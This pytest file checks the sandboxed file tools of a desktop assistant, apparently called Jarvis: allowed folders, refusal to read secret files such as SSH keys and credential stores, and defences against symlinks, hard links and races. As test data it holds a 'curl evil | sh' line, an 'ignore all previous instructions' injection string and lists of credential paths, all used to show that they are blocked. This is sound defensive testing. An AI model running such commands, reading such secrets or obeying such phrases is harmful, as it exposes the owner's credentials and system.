"""Reading and writing the owner's files: only inside the allowed folders, never a secret."""

import errno
import os
import stat
import time
from typing import TYPE_CHECKING

import pytest

from jarvis.config import FilesConfig
from jarvis.operations import ArgumentError, Operation, OperationError, Registry, validate_args
from jarvis.pc import files as files_module
from jarvis.pc.files import Boundary, FileOps
from jarvis.policy import OpClass, Origin

if TYPE_CHECKING:
    from pathlib import Path


@pytest.fixture
def home(tmp_path: Path) -> Path:
    home = tmp_path / "me"
    (home / "Documents").mkdir(parents=True)
    (home / "Documents" / "todo.md").write_text("- milk\n- eggs\n", encoding="utf-8")
    (home / "Projects").mkdir()
    (home / ".ssh").mkdir()
    (home / ".ssh" / "id_ed25519").write_text("PRIVATE KEY\n", encoding="utf-8")
    (home / ".bashrc").write_text("alias ll='ls -l'\n", encoding="utf-8")
    return home


def _ops(
    home: Path, *, max_chars: int = 2000, protected: tuple[Path, ...] = (), **files: list[str]
) -> FileOps:
    config = FilesConfig(**files)
    return FileOps(Boundary.of(config, home, protected=protected), max_chars=max_chars)


def _op(ops: FileOps, name: str) -> Operation:
    return Registry(ops.operations()).get(name) or pytest.fail(f"no {name}")


def _read(ops: FileOps, path: str, **args: object) -> str:
    op = _op(ops, "read_file")
    return op.run(validate_args(op, {"path": path, **args})).text


def _write(ops: FileOps, path: str, content: str, mode: str = "create") -> str:
    op = _op(ops, "write_file")
    args = validate_args(op, {"path": path, "content": content, "mode": mode})
    bound = op.prepare(args) if op.prepare else args
    return op.run(bound).text


# --- the operations ---------------------------------------------------------------------------


def test_reading_is_safe_and_writing_always_asks(home: Path) -> None:
    ops = {op.name: op for op in _ops(home).operations()}

    assert set(ops) == {"list_dir", "read_file", "write_file"}
    assert ops["list_dir"].default_class is OpClass.SAFE
    assert ops["read_file"].default_class is OpClass.SAFE
    assert not ops["read_file"].side_effect
    assert not ops["list_dir"].side_effect
    assert ops["write_file"].default_class is OpClass.CONFIRM
    assert ops["write_file"].side_effect
    assert not any(op.outbound for op in ops.values())


def test_a_file_is_read_as_outside_data(home: Path) -> None:
    op = _op(_ops(home), "read_file")

    result = op.run(validate_args(op, {"path": "~/Documents/todo.md"}))

    assert result.origin is Origin.FILE
    assert "- milk\n- eggs" in result.text
    assert "~/Documents/todo.md" in result.text


@pytest.mark.parametrize("path", ["Documents/todo.md", "~/Documents/todo.md"])
def test_a_path_is_taken_from_the_home_folder(home: Path, path: str) -> None:
    assert "milk" in _read(_ops(home), path)


def test_an_absolute_path_inside_a_root_is_read(home: Path) -> None:
    assert "milk" in _read(_ops(home), str(home / "Documents" / "todo.md"))


@pytest.mark.parametrize(
    "path",
    [
        "/etc/hostname",
        "~/../outside.txt",
        "~/Documents/../../outside.txt",
        "~root/.profile",
    ],
)
def test_a_path_outside_the_read_roots_is_refused(home: Path, path: str) -> None:
    (home.parent / "outside.txt").write_text("not yours\n", encoding="utf-8")

    with pytest.raises(OperationError, match="outside"):
        _read(_ops(home), path)


def test_a_link_out_of_the_roots_is_refused(home: Path) -> None:
    (home.parent / "outside.txt").write_text("not yours\n", encoding="utf-8")
    (home / "Documents" / "sneaky.txt").symlink_to(home.parent / "outside.txt")

    with pytest.raises(OperationError, match="outside"):
        _read(_ops(home), "~/Documents/sneaky.txt")


@pytest.mark.parametrize(
    "path",
    [
        "~/.ssh/id_ed25519",
        "~/Documents/server.pem",
        "~/Documents/.env",
        "~/Documents/aws-credentials.txt",
        "~/.config/gh/hosts.yml",
        "~/.mozilla/profile/logins.json",
    ],
)
def test_a_secret_is_never_read(home: Path, path: str) -> None:
    target = home / path.removeprefix("~/")
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("secret\n", encoding="utf-8")

    with pytest.raises(OperationError, match="private"):
        _read(_ops(home), path)


def test_a_link_to_a_secret_is_refused_as_the_secret(home: Path) -> None:
    (home / "Documents" / "key.txt").symlink_to(home / ".ssh" / "id_ed25519")

    with pytest.raises(OperationError, match="private"):
        _read(_ops(home), "~/Documents/key.txt")


def test_jarvis_own_state_is_never_read(home: Path) -> None:
    state = home / ".local" / "state" / "jarvis"
    state.mkdir(parents=True)
    (state / "notes.txt").write_text("token\n", encoding="utf-8")

    with pytest.raises(OperationError, match="private"):
        _read(_ops(home, protected=(state,)), "~/.local/state/jarvis/notes.txt")


def test_the_owner_can_add_to_what_is_never_read(home: Path) -> None:
    (home / "Documents" / "diary.md").write_text("dear diary\n", encoding="utf-8")

    with pytest.raises(OperationError, match="private"):
        _read(_ops(home, deny=["diary*"]), "~/Documents/diary.md")


def test_an_ordinary_dotfile_opened_by_the_owner_can_be_read(home: Path) -> None:
    # Hidden files under home are shut by default (shell files can hold exported tokens).
    assert "alias ll" in _read(_ops(home, hidden_allow=[".bashrc"]), "~/.bashrc")


def test_only_the_configured_roots_are_readable(home: Path) -> None:
    ops = _ops(home, read_roots=["~/Projects"])

    with pytest.raises(OperationError, match="outside"):
        _read(ops, "~/Documents/todo.md")


def test_a_missing_file_is_said_plainly(home: Path) -> None:
    with pytest.raises(OperationError, match="no file"):
        _read(_ops(home), "~/Documents/nothing.md")


def test_a_folder_is_not_read_as_a_file(home: Path) -> None:
    with pytest.raises(OperationError, match="folder"):
        _read(_ops(home), "~/Documents")


def test_a_pipe_is_never_opened_for_reading(home: Path) -> None:
    os.mkfifo(home / "Documents" / "pipe")

    with pytest.raises(OperationError, match="not a regular file"):
        _read(_ops(home), "~/Documents/pipe")


def test_a_binary_file_is_not_shown_as_text(home: Path) -> None:
    (home / "Documents" / "photo.bin").write_bytes(b"\x89PNG\x00\x00\x01binary")

    with pytest.raises(OperationError, match="not text"):
        _read(_ops(home), "~/Documents/photo.bin")


def test_a_long_file_is_read_in_parts_by_line(home: Path) -> None:
    lines = "".join(f"line {n}\n" for n in range(1, 401))
    (home / "Documents" / "long.txt").write_text(lines, encoding="utf-8")
    ops = _ops(home, max_chars=500)

    first = _read(ops, "~/Documents/long.txt")
    later = _read(ops, "~/Documents/long.txt", from_line=200)

    assert "line 1\n" in first
    assert "line 200" not in first
    assert "from_line=" in first
    assert later.split("\n", 1)[1].startswith("line 200\n")
    assert "of 400" in later


def test_a_line_longer_than_one_part_is_read_on_from_where_it_was_cut(home: Path) -> None:
    line = "".join(f"{n:05d}," for n in range(400))  # 2,400 characters on one line
    (home / "Documents" / "data.json").write_text(f"{line}\nend\n", encoding="utf-8")
    ops = _ops(home, max_chars=500)

    seen, args = "", {}
    for _part in range(20):
        text = _read(ops, "~/Documents/data.json", **args)
        seen += text.split("\n", 1)[1].split("\n(More follows")[0]
        if "(More follows" not in text:
            break
        args = {
            key: int(value)
            for key, value in (
                pair.split("=") for pair in text.rsplit("read_file with ", 1)[1][:-2].split(", ")
            )
        }

    assert seen == f"{line}\nend"  # every character once, in order


def test_a_part_cut_inside_a_line_is_not_reported_as_whole_lines(home: Path) -> None:
    (home / "Documents" / "data.json").write_text("x" * 2400 + "\n", encoding="utf-8")

    text = _read(_ops(home, max_chars=500), "~/Documents/data.json")

    assert "lines 1 to 1" not in text
    assert "from_char=" in text


@pytest.mark.parametrize("from_char", [0, -1, "2"])
def test_a_character_to_read_from_is_a_whole_number_from_1(home: Path, from_char: object) -> None:
    with pytest.raises(ArgumentError):
        _read(_ops(home), "~/Documents/todo.md", from_char=from_char)


def test_reading_from_a_character_past_the_line_is_refused(home: Path) -> None:
    with pytest.raises(OperationError, match="characters"):
        _read(_ops(home), "~/Documents/todo.md", from_line=1, from_char=50)


def _as_data(text: str) -> int:
    """How long `text` is once the agent spells out its brackets and wraps it as `file` data."""
    return len(text) + 3 * (text.count("<") + text.count(">")) + len('<data origin="file"></data>')


def _read_on(text: str) -> dict[str, int]:
    """Return the arguments a part's "More follows" line names, or {} at the end."""
    if "\n(More follows: read_file with " not in text:
        return {}
    named = text.rsplit("read_file with ", 1)[1].removesuffix(".)")
    return {key: int(value) for key, value in (pair.split("=") for pair in named.split(", "))}


@pytest.mark.parametrize(
    "content",
    [
        "".join(f"<a href='#{n}'>item {n}</a>\n" for n in range(300)),  # brackets on every line
        "<" * 3000 + "\n" + "x>" * 900 + "\n",  # lines longer than a part, all brackets
    ],
)
def test_every_part_of_a_file_of_brackets_fits_its_room_once_wrapped(
    home: Path, content: str
) -> None:
    (home / "Documents" / "page.html").write_text(content, encoding="utf-8")
    ops = _ops(home, max_chars=600)

    seen, args = "", {}
    for _part in range(200):
        text = _read(ops, "~/Documents/page.html", **args)
        assert _as_data(text) <= 600  # so the agent never cuts the line that says where to go on
        args = _read_on(text)
        seen += text.split("\n", 1)[1].split("\n(More follows")[0]
        if not args:
            break
        seen += "" if "from_char" in args else "\n"

    assert seen == content.removesuffix("\n")


def test_a_listing_of_names_with_brackets_fits_its_room_once_wrapped(home: Path) -> None:
    for n in range(60):
        (home / "Documents" / f"<<<<{n:02d}>>>>.txt").write_text("x", encoding="utf-8")

    text = _list(_ops(home, max_chars=600), "~/Documents")

    assert _as_data(text) <= 600
    assert text.endswith("more.")


# --- listing ----------------------------------------------------------------------------------


def _list(ops: FileOps, path: str, **args: object) -> str:
    op = _op(ops, "list_dir")
    return op.run(validate_args(op, {"path": path, **args})).text


def test_a_folder_lists_folders_first_and_hides_dotfiles(home: Path) -> None:
    (home / "Documents" / "Notes").mkdir()
    (home / "Documents" / ".hidden").write_text("x", encoding="utf-8")

    text = _list(_ops(home), "~/Documents")

    assert text.index("Notes/") < text.index("todo.md")
    assert ".hidden" not in text


def test_hidden_entries_are_listed_on_request_but_never_a_secret(home: Path) -> None:
    # Hidden things under home are closed unless `files.hidden_allow` opens them (the audit's
    # P1: shell history, app logins and cookies live there), so `.bashrc` shows only once opened.
    text = _list(_ops(home, hidden_allow=[".bashrc"]), "~", hidden=True)

    assert ".bashrc" in text
    assert ".ssh" not in text


@pytest.mark.parametrize(
    "path",
    [
        "~/.bash_history",
        "~/.local/share/opencode/auth.json",
        "~/.config/sops/age/keys.txt",
        "~/.config/Slack/Cookies",
        "~/.agent-browser/sessions/one.json",
        "~/.bashrc",
    ],
)
def test_hidden_things_under_home_are_closed_by_default(home: Path, path: str) -> None:
    target = home / path.removeprefix("~/")
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("token\n", encoding="utf-8")

    with pytest.raises(OperationError, match=r"hidden|private"):
        _read(_ops(home), path)


def test_the_desktops_own_settings_are_open_by_default(home: Path) -> None:
    hypr = home / ".config" / "hypr"
    hypr.mkdir(parents=True)
    (hypr / "bindings.conf").write_text("bind = SUPER, Return, exec, kitty\n", encoding="utf-8")
    (home / ".config" / "Slack").mkdir()

    assert "SUPER, Return" in _read(_ops(home), "~/.config/hypr/bindings.conf")
    listing = _list(_ops(home), "~/.config", hidden=True)
    assert "hypr" in listing
    assert "Slack" not in listing
    with pytest.raises(OperationError, match="hidden"):
        _read(_ops(home), "~/.config/mimeapps.list")


@pytest.mark.parametrize(
    "path",
    ["~/Documents/old/.zsh_history", "~/Projects/site/.histfile", "~/Documents/web/Cookies"],
)
def test_history_and_cookie_files_are_secrets_anywhere(home: Path, path: str) -> None:
    target = home / path.removeprefix("~/")
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("token\n", encoding="utf-8")

    with pytest.raises(OperationError, match="private"):
        _read(_ops(home), path)


def test_a_hidden_folder_opened_by_the_owner_can_be_read(home: Path) -> None:
    notes = home / ".notes"
    notes.mkdir()
    (notes / "today.md").write_text("call mum\n", encoding="utf-8")

    assert "call mum" in _read(_ops(home, hidden_allow=[".notes"]), "~/.notes/today.md")


def test_a_pattern_narrows_the_listing(home: Path) -> None:
    (home / "Documents" / "plan.txt").write_text("x", encoding="utf-8")

    text = _list(_ops(home), "~/Documents", pattern="*.MD")

    assert "todo.md" in text
    assert "plan.txt" not in text


def test_a_listing_is_outside_data_since_anyone_can_name_a_file(home: Path) -> None:
    op = _op(_ops(home), "list_dir")

    assert op.run(validate_args(op, {"path": "~/Documents"})).origin is Origin.FILE


def test_a_huge_folder_is_listed_in_part(home: Path) -> None:
    for number in range(300):
        (home / "Projects" / f"f{number:03}.txt").write_text("", encoding="utf-8")

    text = _list(_ops(home, max_chars=50_000), "~/Projects")

    assert "f000.txt" in text
    assert "and 100 more" in text


def test_a_listing_stops_at_the_room_for_one_result(home: Path) -> None:
    for number in range(100):
        (home / "Projects" / f"f{number:03}.txt").write_text("", encoding="utf-8")

    text = _list(_ops(home, max_chars=600), "~/Projects")

    assert len(text) <= 600
    assert "more" in text.splitlines()[-1]


def test_a_secret_folder_is_not_listed(home: Path) -> None:
    with pytest.raises(OperationError, match="private"):
        _list(_ops(home), "~/.ssh")


# --- writing ----------------------------------------------------------------------------------


def test_a_new_file_is_created_in_the_write_root(home: Path) -> None:
    said = _write(_ops(home), "~/Documents/new/idea.md", "# Idea")

    created = home / "Documents" / "new" / "idea.md"
    assert created.read_text(encoding="utf-8") == "# Idea\n"
    assert not created.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    assert "~/Documents/new/idea.md" in said


def test_create_never_overwrites(home: Path) -> None:
    with pytest.raises(OperationError, match="already exists"):
        _write(_ops(home), "~/Documents/todo.md", "gone")

    assert "milk" in (home / "Documents" / "todo.md").read_text(encoding="utf-8")


def test_replace_and_append(home: Path) -> None:
    ops = _ops(home)
    _write(ops, "~/Documents/todo.md", "- bread", mode="append")
    assert (home / "Documents" / "todo.md").read_text(encoding="utf-8").endswith("- bread\n")

    _write(ops, "~/Documents/todo.md", "only this", mode="replace")
    assert (home / "Documents" / "todo.md").read_text(encoding="utf-8") == "only this\n"


@pytest.mark.parametrize(
    "path",
    [
        "~/Projects/x.md",
        "~/x.md",
        "~/.bashrc",
        "~/Documents/../.config/autostart/x.desktop",
        "/etc/x.conf",
    ],
)
def test_a_write_outside_the_write_roots_is_refused(home: Path, path: str) -> None:
    with pytest.raises(OperationError, match="outside"):
        _write(_ops(home), path, "x", mode="replace")


def test_a_hidden_file_is_never_written_even_in_a_root(home: Path) -> None:
    with pytest.raises(OperationError, match="hidden"):
        _write(_ops(home), "~/Documents/.profile", "x")


def test_a_secret_name_is_never_written(home: Path) -> None:
    with pytest.raises(OperationError, match="private"):
        _write(_ops(home), "~/Documents/server.key", "x")


def test_a_link_in_the_write_root_cannot_carry_a_write_out(home: Path) -> None:
    (home / "Documents" / "rc").symlink_to(home / ".bashrc")

    with pytest.raises(OperationError, match="outside"):
        _write(_ops(home), "~/Documents/rc", "evil", mode="replace")

    assert "alias" in (home / ".bashrc").read_text(encoding="utf-8")


def test_the_yes_is_for_the_resolved_path_and_a_changed_one_is_refused(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/plan.md", "content": "x", "mode": "replace"})
    assert op.prepare is not None
    bound = op.prepare(args)
    assert bound["path"] == str(home / "Documents" / "plan.md")
    assert "plan.md in Documents" in op.spoken_summary(bound)

    # Between the question and the yes, the name turns into a link to a file outside.
    (home / "Documents" / "plan.md").symlink_to(home / ".bashrc")

    with pytest.raises(OperationError):
        op.run(bound)
    assert "alias" in (home / ".bashrc").read_text(encoding="utf-8")


def test_the_question_names_the_file_and_how(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/todo.md", "content": "x", "mode": "append"})
    assert op.prepare is not None

    summary = op.spoken_summary(op.prepare(args))

    assert summary == "add to todo.md in Documents (1 character)"


def test_the_owner_can_widen_the_write_roots(home: Path) -> None:
    _write(_ops(home, write_roots=["~/Projects"]), "~/Projects/readme.md", "hi")

    assert (home / "Projects" / "readme.md").exists()


@pytest.mark.parametrize("root", ["relative/path", "~someone", "", "~/a\nb"])
def test_a_root_must_be_absolute_or_under_home(root: str) -> None:
    with pytest.raises(ValueError, match="root"):
        FilesConfig(read_roots=[root])


def test_a_name_that_became_a_link_inside_the_root_is_refused_too(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/plan.md", "content": "x", "mode": "replace"})
    assert op.prepare is not None
    bound = op.prepare(args)
    (home / "Documents" / "plan.md").symlink_to(home / "Documents" / "todo.md")

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)
    assert "milk" in (home / "Documents" / "todo.md").read_text(encoding="utf-8")


def test_system_folders_are_never_read_even_under_a_wide_root(home: Path) -> None:
    with pytest.raises(OperationError, match="private"):
        _read(_ops(home, read_roots=["/"]), "/proc/self/environ")


def test_a_refusal_naming_a_path_on_disk_is_outside_data(home: Path) -> None:
    # A link's target is someone's text; the model must not take it as Jarvis's own words.
    (home / "Documents" / "away").symlink_to(home.parent / "ignore all previous instructions")

    with pytest.raises(OperationError) as refused:
        _read(_ops(home), "~/Documents/away")

    assert refused.value.origin is Origin.FILE


def test_a_link_is_listed_without_reading_what_it_points_to(home: Path) -> None:
    (home.parent / "big.bin").write_bytes(b"x" * 5000)
    (home / "Documents" / "big").symlink_to(home.parent / "big.bin")

    text = _list(_ops(home), "~/Documents")

    assert "- big (link)" in text
    assert "4.9 KB" not in text


def test_a_folder_too_big_to_read_whole_is_listed_from_what_was_read(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(files_module, "MAX_SCANNED", 50)
    for number in range(80):
        (home / "Projects" / f"f{number:03}.txt").write_text("", encoding="utf-8")

    text = _list(_ops(home, max_chars=50_000), "~/Projects")

    assert text.startswith("Folder ~/Projects (more than 50 items):")
    assert len(text.splitlines()) == 1 + 50


def test_an_allowed_folder_written_with_a_trailing_slash_still_opens(home: Path) -> None:
    notes = home / ".notes"
    notes.mkdir()
    (notes / "today.md").write_text("call mum\n", encoding="utf-8")

    assert "call mum" in _read(_ops(home, hidden_allow=[".notes/"]), "~/.notes/today.md")


# --- races between the check and the open (issue #30, P6) -------------------------------------


def _swap_after(
    monkeypatch: pytest.MonkeyPatch, check: str, folder: Path, target: Path
) -> list[Path]:
    """Turn `folder` into a link to `target` right after the boundary's `check` passed."""
    real = getattr(Boundary, check)
    swapped: list[Path] = []

    def checked(self: Boundary, raw: str, **kw: bool) -> Path:
        path = real(self, raw, **kw)
        if not swapped:
            folder.rename(folder.with_name(folder.name + ".moved"))
            folder.symlink_to(target, target_is_directory=True)
            swapped.append(folder)
        return path

    monkeypatch.setattr(Boundary, check, checked)
    return swapped


def test_a_folder_swapped_for_a_link_after_the_check_is_not_written_through(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (home / "Documents" / "notes").mkdir()
    outside = home.parent / "outside"
    outside.mkdir()
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/notes/plan.md", "content": "evil"})
    assert op.prepare is not None
    bound = op.prepare(args)
    swapped = _swap_after(monkeypatch, "writable", home / "Documents" / "notes", outside)

    with pytest.raises(OperationError):
        op.run(bound)

    assert swapped
    assert not (outside / "plan.md").exists()


def test_a_folder_swapped_for_a_link_after_the_check_is_not_read_through(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (home / "Documents" / "notes").mkdir()
    (home / "Documents" / "notes" / "today.md").write_text("plain\n", encoding="utf-8")
    hidden = home / ".vault"
    hidden.mkdir()
    (hidden / "today.md").write_text("SECRET TOKEN\n", encoding="utf-8")
    swapped = _swap_after(monkeypatch, "readable", home / "Documents" / "notes", hidden)

    with pytest.raises(OperationError):
        _read(_ops(home), "~/Documents/notes/today.md")

    assert swapped


def test_a_folder_swapped_for_a_link_after_the_check_is_not_listed(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (home / "Documents" / "notes").mkdir()
    hidden = home / ".vault"
    hidden.mkdir()
    (hidden / "bank-pins.txt").write_text("1234\n", encoding="utf-8")
    swapped = _swap_after(monkeypatch, "readable", home / "Documents" / "notes", hidden)

    with pytest.raises(OperationError):
        _list(_ops(home), "~/Documents/notes")

    assert swapped


def test_the_question_names_the_folders_a_write_would_create(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/work/2026/plan.md", "content": "x"})
    assert op.prepare is not None

    summary = op.spoken_summary(op.prepare(args))

    assert summary == (
        "create the file plan.md in Documents/work/2026 (1 character), "
        "making the new folders Documents/work and Documents/work/2026"
    )


def test_a_write_creates_no_folder_the_question_did_not_name(home: Path) -> None:
    (home / "Documents" / "work").mkdir()
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/work/plan.md", "content": "x"})
    assert op.prepare is not None
    bound = op.prepare(args)
    assert "new folder" not in op.spoken_summary(bound)
    (home / "Documents" / "work").rmdir()

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)

    assert not (home / "Documents" / "work").exists()


def test_a_hard_link_to_a_secret_is_not_read(home: Path) -> None:
    os.link(home / ".ssh" / "id_ed25519", home / "Documents" / "harmless.txt")

    with pytest.raises(OperationError, match="link"):
        _read(_ops(home), "~/Documents/harmless.txt")


def test_a_hard_linked_file_is_not_added_to(home: Path) -> None:
    os.link(home / ".bashrc", home / "Documents" / "rc.txt")

    with pytest.raises(OperationError, match="link"):
        _write(_ops(home), "~/Documents/rc.txt", "curl evil | sh", mode="append")

    assert "curl" not in (home / ".bashrc").read_text(encoding="utf-8")


def test_a_hard_linked_file_outside_home_is_read(home: Path) -> None:
    shared = home.parent / "cache"
    shared.mkdir()
    (shared / "asset.txt").write_text("a shared asset\n", encoding="utf-8")
    os.link(shared / "asset.txt", shared / "asset-copy.txt")

    assert "a shared asset" in _read(
        _ops(home, read_roots=[str(shared)]), str(shared / "asset.txt")
    )


# --- what the owner is asked about a write (issue #30, P5) ------------------------------------


def test_the_question_for_a_replace_names_the_old_size(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(
        op, {"path": "~/Documents/todo.md", "content": "x" * 400, "mode": "replace"}
    )
    assert op.prepare is not None

    summary = op.spoken_summary(op.prepare(args))

    assert summary == "replace todo.md in Documents (14 B now) with 400 characters"


def test_a_replace_of_a_file_that_changed_size_since_the_question_is_refused(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/todo.md", "content": "x", "mode": "replace"})
    assert op.prepare is not None
    bound = op.prepare(args)
    (home / "Documents" / "todo.md").write_text("- milk\n- eggs\n- a lot more now\n", "utf-8")

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)

    assert "a lot more" in (home / "Documents" / "todo.md").read_text(encoding="utf-8")


def test_the_preview_shows_the_first_three_lines_of_what_is_written(home: Path) -> None:
    op = _op(_ops(home), "write_file")
    content = "first\nsecond\x1b[31m red\nthird\nfourth\nfifth"
    args = validate_args(op, {"path": "~/Documents/todo.md", "content": content, "mode": "replace"})
    assert op.prepare is not None
    assert op.preview is not None

    preview = op.preview(op.prepare(args))

    assert preview.splitlines() == ["first", "second�[31m red", "third", "(and 2 more lines)"]


def test_a_folder_that_cannot_be_entered_is_said_as_such_not_as_a_change(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The refusal is what the folder walk raises; faked, so it holds for any user, root too.
    locked = home / "Documents" / "locked"
    locked.mkdir()
    (locked / "a.md").write_text("x\n", encoding="utf-8")
    real = files_module._open_inner  # pyright: ignore[reportPrivateUsage] - the walk's opener, wrapped to refuse one folder

    def denied(fd: int, name: str, *, make: bool) -> int:
        if name == "locked":
            raise PermissionError(errno.EACCES, os.strerror(errno.EACCES), name)
        return real(fd, name, make=make)

    monkeypatch.setattr(files_module, "_open_inner", denied)

    with pytest.raises(OperationError, match="couldn't open") as refused:
        _read(_ops(home), "~/Documents/locked/a.md")
    assert "changed" not in str(refused.value)
    assert "Permission denied" in str(refused.value)


# --- the review of #30: a replace keeps the mode and refuses a same-size swap -----------------


@pytest.mark.parametrize(
    ("before", "after"),
    [(0o600, 0o600), (0o640, 0o640), (0o664, 0o664), (0o755, 0o644)],
    ids=["private", "group-read", "group-write", "executable-not-carried"],
)
def test_a_replace_keeps_the_old_files_permissions(home: Path, before: int, after: int) -> None:
    todo = home / "Documents" / "todo.md"
    todo.chmod(before)

    _write(_ops(home), "~/Documents/todo.md", "only this", mode="replace")

    assert todo.read_text(encoding="utf-8") == "only this\n"
    assert stat.S_IMODE(todo.stat().st_mode) == after


def test_the_replacement_is_private_until_it_has_the_old_mode(
    home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (home / "Documents" / "todo.md").chmod(0o640)
    before: list[int] = []
    real = os.fchmod

    def noted(fd: int, mode: int) -> None:
        before.append(stat.S_IMODE(os.fstat(fd).st_mode))
        real(fd, mode)

    monkeypatch.setattr(files_module.os, "fchmod", noted)

    _write(_ops(home), "~/Documents/todo.md", "only this", mode="replace")

    assert before == [0o600]


def _bound_replace(home: Path) -> tuple[Operation, dict[str, object]]:
    op = _op(_ops(home), "write_file")
    args = validate_args(op, {"path": "~/Documents/todo.md", "content": "x", "mode": "replace"})
    assert op.prepare is not None
    return op, op.prepare(args)


def test_a_file_swapped_for_another_of_the_same_size_and_time_is_not_replaced(home: Path) -> None:
    todo = home / "Documents" / "todo.md"
    op, bound = _bound_replace(home)
    old = todo.stat()
    other = home / "Documents" / "other.md"
    other.write_text("- beer\n- wine\n", encoding="utf-8")
    os.utime(other, ns=(old.st_atime_ns, old.st_mtime_ns))
    other.replace(todo)
    assert (todo.stat().st_size, todo.stat().st_mtime_ns) == (old.st_size, old.st_mtime_ns)

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)

    assert todo.read_text(encoding="utf-8") == "- beer\n- wine\n"


def test_a_file_rewritten_to_the_same_size_since_the_question_is_not_replaced(home: Path) -> None:
    todo = home / "Documents" / "todo.md"
    op, bound = _bound_replace(home)
    old = todo.stat()
    todo.write_text("- beer\n- wine\n", encoding="utf-8")
    os.utime(todo, ns=(old.st_atime_ns, old.st_mtime_ns + 1_000_000))
    assert (todo.stat().st_size, todo.stat().st_ino) == (old.st_size, old.st_ino)

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)

    assert todo.read_text(encoding="utf-8") == "- beer\n- wine\n"


def test_a_rewrite_with_its_time_set_back_is_not_replaced_either(home: Path) -> None:
    todo = home / "Documents" / "todo.md"
    op, bound = _bound_replace(home)
    old = todo.stat()
    for _ in range(200):  # until the change time moves on, which a coarse clock may delay
        todo.write_text("- beer\n- wine\n", encoding="utf-8")
        os.utime(todo, ns=(old.st_atime_ns, old.st_mtime_ns))  # the change time cannot be set back
        if todo.stat().st_ctime_ns != old.st_ctime_ns:
            break
        time.sleep(0.005)
    now = todo.stat()
    assert now.st_ctime_ns != old.st_ctime_ns
    assert (now.st_size, now.st_ino, now.st_mtime_ns) == (old.st_size, old.st_ino, old.st_mtime_ns)

    with pytest.raises(OperationError, match="changed"):
        op.run(bound)

    assert todo.read_text(encoding="utf-8") == "- beer\n- wine\n"
